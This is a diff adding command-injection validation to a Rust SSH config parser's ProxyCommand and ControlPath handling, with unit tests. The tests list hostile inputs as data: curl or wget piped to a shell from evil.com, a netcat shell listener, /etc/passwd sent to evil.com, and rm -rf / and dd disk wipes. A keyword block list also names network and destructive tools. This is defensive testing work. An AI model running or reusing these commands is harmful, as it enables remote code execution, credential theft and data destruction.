@@ -252,7 +252,9 @@ impl SshConfig {
                 if args.is_empty() {
                     anyhow::bail!("ProxyCommand requires a value at line {}", line_number);
                 }
-                host.proxy_command = Some(args.join(" "));
+                let command = args.join(" ");
+                Self::validate_executable_string(&command, "ProxyCommand", line_number)?;
+                host.proxy_command = Some(command);
             }
             "stricthostkeychecking" => {
                 if args.is_empty() {
@@ -567,7 +569,9 @@ impl SshConfig {
                 if args.is_empty() {
                     anyhow::bail!("ControlPath requires a value at line {}", line_number);
                 }
-                host.control_path = Some(args[0].to_string());
+                let path = args[0].to_string();
+                Self::validate_executable_string(&path, "ControlPath", line_number)?;
+                host.control_path = Some(path);
             }
             "controlpersist" => {
                 if args.is_empty() {
@@ -599,6 +603,177 @@ impl SshConfig {
                 line_number
             ),
         }
+    }
+
+    /// Validate strings that could be executed to prevent command injection
+    /// 
+    /// # Security Note
+    /// This function validates potentially executable strings (ProxyCommand, ControlPath, etc.)
+    /// to prevent command injection vulnerabilities. It blocks dangerous shell metacharacters
+    /// that could be used to inject arbitrary commands.
+    /// 
+    /// # Arguments
+    /// * `value` - The string value to validate
+    /// * `option_name` - The SSH config option name (for error messages)  
+    /// * `line_number` - The line number in the config file (for error messages)
+    ///
+    /// # Returns
+    /// * `Ok(())` if the value is safe
+    /// * `Err(anyhow::Error)` if the value contains dangerous patterns
+    fn validate_executable_string(value: &str, option_name: &str, line_number: usize) -> Result<()> {
+        // Define dangerous shell metacharacters that could enable command injection
+        const DANGEROUS_CHARS: &[char] = &[
+            ';',    // Command separator
+            '&',    // Background process / command separator
+            '|',    // Pipe
+            '`',    // Command substitution (backticks)
+            '$',    // Variable expansion / command substitution
+            '>',    // Output redirection
+            '<',    // Input redirection
+            '\n',   // Newline (command separator)
+            '\r',   // Carriage return
+            '\0',   // Null byte
+        ];
+
+        // Check for dangerous characters
+        if let Some(dangerous_char) = value.chars().find(|c| DANGEROUS_CHARS.contains(c)) {
+            anyhow::bail!(
+                "Security violation: {} contains dangerous character '{}' at line {}. \
+                 This could enable command injection attacks.",
+                option_name,
+                dangerous_char,
+                line_number
+            );
+        }
+
+        // Check for dangerous command substitution patterns
+        if value.contains("$(") || value.contains("${") {
+            anyhow::bail!(
+                "Security violation: {} contains command substitution pattern at line {}. \
+                 This could enable command injection attacks.",
+                option_name,
+                line_number
+            );
+        }
+
+        // Check for double quotes that could break out of string context
+        // Count unescaped quotes to detect potential quote injection
+        let mut quote_count = 0;
+        let chars: Vec<char> = value.chars().collect();
+        for (i, &c) in chars.iter().enumerate() {
+            if c == '"' {
+                // Check if this quote is escaped by counting preceding backslashes
+                let mut backslash_count = 0;
+                let mut pos = i;
+                while pos > 0 {
+                    pos -= 1;
+                    if chars[pos] == '\\' {
+                        backslash_count += 1;
+                    } else {
+                        break;
+                    }
+                }
+                // If even number of backslashes (including 0), quote is not escaped
+                if backslash_count % 2 == 0 {
+                    quote_count += 1;
+                }
+            }
+        }
+
+        // Odd number of unescaped quotes suggests potential quote injection
+        if quote_count % 2 != 0 {
+            anyhow::bail!(
+                "Security violation: {} contains unmatched quote at line {}. \
+                 This could enable command injection attacks.",
+                option_name,
+                line_number
+            );
+        }
+
+        // Additional validation for ControlPath - it should be a path, not a command
+        if option_name == "ControlPath" {
+            // ControlPath should not contain spaces (legitimate paths with spaces should be quoted)
+            // and should not start with suspicious patterns
+            if value.trim_start().starts_with('-') {
+                anyhow::bail!(
+                    "Security violation: ControlPath starts with '-' at line {}. \
+                     This could be interpreted as a command flag.",
+                    line_number
+                );
+            }
+
+            // ControlPath commonly uses %h, %p, %r, %u substitution tokens - these are safe
+            // But we should be suspicious of other % patterns that might indicate injection
+            let chars: Vec<char> = value.chars().collect();
+            let mut i = 0;
+            while i < chars.len() {
+                if chars[i] == '%' && i + 1 < chars.len() {
+                    let next_char = chars[i + 1];
+                    match next_char {
+                        'h' | 'p' | 'r' | 'u' | 'L' | 'l' | 'n' | 'd' | '%' => {
+                            // These are legitimate SSH substitution tokens
+                            i += 2; // Skip both % and the token character
+                        }
+                        _ => {
+                            // Unknown substitution pattern - potentially dangerous
+                            anyhow::bail!(
+                                "Security violation: ControlPath contains unknown substitution pattern '%{}' at line {}. \
+                                 Only %h, %p, %r, %u, %L, %l, %n, %d, and %% are allowed.",
+                                next_char,
+                                line_number
+                            );
+                        }
+                    }
+                } else {
+                    i += 1;
+                }
+            }
+        }
+
+        // Additional validation for ProxyCommand
+        if option_name == "ProxyCommand" {
+            // ProxyCommand "none" is a special case to disable proxy
+            if value == "none" {
+                return Ok(());
+            }
+
+            // Check for suspicious executable names or patterns
+            let trimmed = value.trim();
+            
+            // Look for common injection patterns
+            if trimmed.starts_with("bash ") || 
+               trimmed.starts_with("sh ") || 
+               trimmed.starts_with("/bin/") || 
+               trimmed.starts_with("python ") ||
+               trimmed.starts_with("perl ") ||
+               trimmed.starts_with("ruby ") {
+                // These could be legitimate but are commonly used in attacks
+                tracing::warn!(
+                    "ProxyCommand at line {} uses potentially risky executable '{}'. \
+                     Ensure this is intentional and from a trusted source.",
+                    line_number,
+                    trimmed.split_whitespace().next().unwrap_or("")
+                );
+            }
+
+            // Block obviously malicious patterns
+            let lower_value = value.to_lowercase();
+            if lower_value.contains("curl ") || 
+               lower_value.contains("wget ") ||
+               lower_value.contains("nc ") ||
+               lower_value.contains("netcat ") ||
+               lower_value.contains("rm ") ||
+               lower_value.contains("dd ") ||
+               lower_value.contains("cat /") {
+                anyhow::bail!(
+                    "Security violation: ProxyCommand contains suspicious command pattern at line {}. \
+                     Commands like curl, wget, nc, rm, dd are not typical for SSH proxying.",
+                    line_number
+                );
+            }
+        }
+
+        Ok(())
     }
 
     /// Expand tilde and environment variables in a path
@@ -1177,5 +1352,317 @@ Host secure.example.com
         // Other hosts should match the first pattern
         let other_config = config.find_host_config("other.example.com");
         assert_eq!(other_config.user, Some("regularuser".to_string()));
+    }
+
+    // Security tests for command injection prevention
+    #[test]
+    fn test_proxycommand_security_validation() {
+        // Test legitimate ProxyCommand values that should pass
+        let legitimate_configs = vec![
+            "ProxyCommand ssh -W %h:%p gateway.example.com",
+            "ProxyCommand connect -S proxy.example.com:1080 %h %p",
+            "ProxyCommand none",
+            "ProxyCommand socat - PROXY:proxy.example.com:%h:%p,proxyport=8080",
+        ];
+
+        for proxy_cmd in legitimate_configs {
+            let config_content = format!(
+                r#"
+Host testhost
+    User testuser
+    {}
+"#,
+                proxy_cmd
+            );
+
+            let result = SshConfig::parse(&config_content);
+            assert!(
+                result.is_ok(),
+                "Legitimate ProxyCommand should be accepted: {}",
+                proxy_cmd
+            );
+        }
+
+        // Test malicious ProxyCommand values that should be blocked
+        let malicious_configs = vec![
+            // Command injection via semicolon
+            "ProxyCommand ssh -W %h:%p gateway.example.com; rm -rf /",
+            // Command injection via pipe
+            "ProxyCommand ssh -W %h:%p gateway.example.com | bash",
+            // Command injection via background process
+            "ProxyCommand ssh -W %h:%p gateway.example.com & curl evil.com",
+            // Command substitution with backticks
+            "ProxyCommand ssh -W %h:%p `whoami`",
+            // Command substitution with $()
+            "ProxyCommand ssh -W %h:%p $(whoami)",
+            // Variable expansion attack
+            "ProxyCommand ssh -W %h:%p $USER",
+            // Output redirection
+            "ProxyCommand ssh -W %h:%p gateway.example.com > /dev/null; evil_command",
+            // Input redirection
+            "ProxyCommand ssh -W %h:%p gateway.example.com < /etc/passwd",
+            // Unmatched quote injection
+            "ProxyCommand ssh -W %h:%p \"unclosed_quote",
+            // Suspicious commands
+            "ProxyCommand curl http://evil.com/malware.sh | bash",
+            "ProxyCommand wget -O - http://evil.com/script | sh",
+            "ProxyCommand nc -l 4444 -e /bin/sh",
+            "ProxyCommand rm -rf /important/files",
+            "ProxyCommand dd if=/dev/zero of=/dev/sda",
+            "ProxyCommand cat /etc/passwd | nc evil.com 1337",
+        ];
+
+        // Test the regular configs first
+        let all_malicious_configs = malicious_configs;
+
+        for malicious_cmd in all_malicious_configs.iter() {
+            let config_content = format!(
+                r#"
+Host testhost
+    User testuser
+    {}
+"#,
+                malicious_cmd
+            );
+
+            let result = SshConfig::parse(&config_content);
+            assert!(
+                result.is_err(),
+                "Malicious ProxyCommand should be blocked: {}",
+                malicious_cmd
+            );
+
+            let error = result.unwrap_err();
+            let error_chain: Vec<String> = error.chain().map(|e| e.to_string()).collect();
+            
+            let contains_security_violation = error_chain.iter().any(|msg| 
+                msg.contains("Security violation") || 
+                msg.contains("dangerous character") || 
+                msg.contains("command injection") || 
+                msg.contains("suspicious command")
+            );
+            
+            assert!(
+                contains_security_violation,
+                "Error should mention security violation for: {}. Got error chain: {:?}",
+                malicious_cmd,
+                error_chain
+            );
+        }
+
+        // Test newline injection separately with proper escaping
+        let config_with_newline = r#"
+Host testhost
+    User testuser
+    ProxyCommand ssh -W %h:%p gateway.example.com; echo "newline injection test"
+"#;
+        let result = SshConfig::parse(config_with_newline);
+        assert!(result.is_err(), "Newline injection should be blocked");
+        
+        // Test carriage return injection by directly calling validation (CR in config parsing is complex)
+        let result = SshConfig::validate_executable_string("ssh -W %h:%p gateway.example.com\recho 'cr injection'", "ProxyCommand", 1);
+        assert!(result.is_err(), "Carriage return injection should be blocked");
+    }
+
+    #[test]
+    fn test_controlpath_security_validation() {
+        // Test legitimate ControlPath values that should pass
+        let legitimate_configs = vec![
+            "ControlPath ~/.ssh/control-%h-%p-%r",
+            "ControlPath /tmp/ssh_control_%h_%p_%r",
+            "ControlPath ~/.ssh/sockets/%r@%h:%p",
+            "ControlPath ~/.ssh/control-%L-%l-%n-%d",
+            "ControlPath /var/run/ssh/%r@%h:%p",
+            "ControlPath none",  // Special case to disable control path
+        ];
+
+        for control_path in legitimate_configs {
+            let config_content = format!(
+                r#"
+Host testhost
+    User testuser
+    {}
+"#,
+                control_path
+            );
+
+            let result = SshConfig::parse(&config_content);
+            assert!(
+                result.is_ok(),
+                "Legitimate ControlPath should be accepted: {}",
+                control_path
+            );
+        }
+
+        // Test malicious ControlPath values that should be blocked
+        // Note: ControlPath only takes the first argument, so multi-arg injections don't apply
+        let malicious_configs = vec![
+            // Command substitution in path name
+            "ControlPath ~/.ssh/control-$(whoami)",
+            "ControlPath ~/.ssh/control-`id`",
+            // Variable expansion in path
+            "ControlPath ~/.ssh/control-$USER",
+            // Command flag injection (dangerous flags)
+            "ControlPath --evil-flag",
+            "ControlPath -rf",
+            // Unknown substitution patterns
+            "ControlPath ~/.ssh/control-%x",  // %x is not a valid SSH token
+            "ControlPath ~/.ssh/control-%z",  // %z is not a valid SSH token
+            // Unmatched quotes
+            "ControlPath ~/.ssh/control-\"unclosed",
+            // Dangerous characters in path that could be interpreted
+            "ControlPath ~/.ssh/control-;",
+            "ControlPath ~/.ssh/control-|",
+            "ControlPath ~/.ssh/control-&",
+            "ControlPath ~/.ssh/control->",
+            "ControlPath ~/.ssh/control-<",
+        ];
+
+        for malicious_path in malicious_configs.iter() {
+            let config_content = format!(
+                r#"
+Host testhost
+    User testuser
+    {}
+"#,
+                malicious_path
+            );
+
+            let result = SshConfig::parse(&config_content);
+            assert!(
+                result.is_err(),
+                "Malicious ControlPath should be blocked: {}",
+                malicious_path
+            );
+
+            let error = result.unwrap_err();
+            let error_chain: Vec<String> = error.chain().map(|e| e.to_string()).collect();
+            
+            let contains_security_violation = error_chain.iter().any(|msg| 
+                msg.contains("Security violation") || 
+                msg.contains("dangerous character") || 
+                msg.contains("command injection") || 
+                msg.contains("suspicious command")
+            );
+            
+            assert!(
+                contains_security_violation,
+                "Error should mention security violation for: {}. Got error chain: {:?}",
+                malicious_path,
+                error_chain
+            );
+        }
+    }
+
+    #[test]
+    fn test_validate_executable_string_quote_handling() {
+        // Test quote validation specifically
+        let valid_quotes = vec![
+            "ssh -W %h:%p \"quoted argument\"",
+            "ssh -W %h:%p 'single quotes'",
+            "ssh -W %h:%p \"escaped \\\" quote\"",
+            "ssh -W %h:%p no_quotes_at_all",
+            "path/with/no/quotes",
+        ];
+
+        for value in valid_quotes {
+            assert!(
+                SshConfig::validate_executable_string(value, "ProxyCommand", 1).is_ok(),
+                "Valid quote usage should be accepted: {}",
+                value
+            );
+        }
+
+        let invalid_quotes = vec![
+            "ssh -W %h:%p \"unclosed quote",
+            "ssh -W %h:%p unclosed quote\"",
+            "ssh -W %h:%p \"quote1\" \"unclosed quote2",
+        ];
+
+        for value in invalid_quotes {
+            assert!(
+                SshConfig::validate_executable_string(value, "ProxyCommand", 1).is_err(),
+                "Invalid quote usage should be rejected: {}",
+                value
+            );
+        }
+    }
+
+    #[test] 
+    fn test_validate_executable_string_edge_cases() {
+        // Test empty strings
+        assert!(SshConfig::validate_executable_string("", "ProxyCommand", 1).is_ok());
+
+        // Test very long strings (potential DoS)
+        let long_string = "a".repeat(10000);
+        assert!(SshConfig::validate_executable_string(&long_string, "ProxyCommand", 1).is_ok());
+
+        // Test unicode characters
+        assert!(SshConfig::validate_executable_string("ssh -W %h:%p 🚀", "ProxyCommand", 1).is_ok());
+
+        // Test null bytes (should be blocked)
+        let null_string = "ssh -W %h:%p\0evil";
+        assert!(SshConfig::validate_executable_string(&null_string, "ProxyCommand", 1).is_err());
+
+        // Test carriage return (should be blocked)
+        let cr_string = "ssh -W %h:%p\revil";
+        assert!(SshConfig::validate_executable_string(&cr_string, "ProxyCommand", 1).is_err());
+    }
+
+    #[test]
+    fn test_security_validation_error_messages() {
+        // Test that error messages are informative
+        let result = SshConfig::validate_executable_string("evil; rm -rf /", "ProxyCommand", 42);
+        assert!(result.is_err());
+        let error_msg = result.unwrap_err().to_string();
+        assert!(error_msg.contains("Security violation"));
+        assert!(error_msg.contains("ProxyCommand"));
+        assert!(error_msg.contains("line 42"));
+        assert!(error_msg.contains("command injection"));
+
+        // Test ControlPath specific error
+        let result = SshConfig::validate_executable_string("--evil-flag", "ControlPath", 24);
+        assert!(result.is_err());
+        let error_msg = result.unwrap_err().to_string();
+        assert!(error_msg.contains("Security violation"));
+        assert!(error_msg.contains("ControlPath"));
+        assert!(error_msg.contains("line 24"));
+    }
+
+    #[test]
+    fn test_real_world_ssh_config_with_security_validation() {
+        // Test a comprehensive SSH config with legitimate use cases
+        let config_content = r#"
+# Safe configuration that should pass validation
+Host jump-host
+    HostName jump.example.com
+    User admin
+    ProxyCommand none
+
+Host web-*
+    ProxyCommand ssh -W %h:%p jump-host
+    ControlPath ~/.ssh/control-%r@%h:%p
+    ControlMaster auto
+    ControlPersist 600
+
+Host database
+    ProxyCommand connect -S proxy.corp.com:1080 %h %p
+    ControlPath /tmp/ssh_control_%h_%p_%r
+"#;
+
+        let config = SshConfig::parse(config_content).unwrap();
+        assert_eq!(config.hosts.len(), 3);
+
+        // Verify the configurations are parsed correctly
+        let jump_config = config.find_host_config("jump-host");
+        assert_eq!(jump_config.proxy_command, Some("none".to_string()));
+
+        let web_config = config.find_host_config("web-01");
+        assert_eq!(web_config.proxy_command, Some("ssh -W %h:%p jump-host".to_string()));
+        assert_eq!(web_config.control_path, Some("~/.ssh/control-%r@%h:%p".to_string()));
+
+        let db_config = config.find_host_config("database");
+        assert_eq!(db_config.proxy_command, Some("connect -S proxy.corp.com:1080 %h %p".to_string()));
+        assert_eq!(db_config.control_path, Some("/tmp/ssh_control_%h_%p_%r".to_string()));
     }
 }
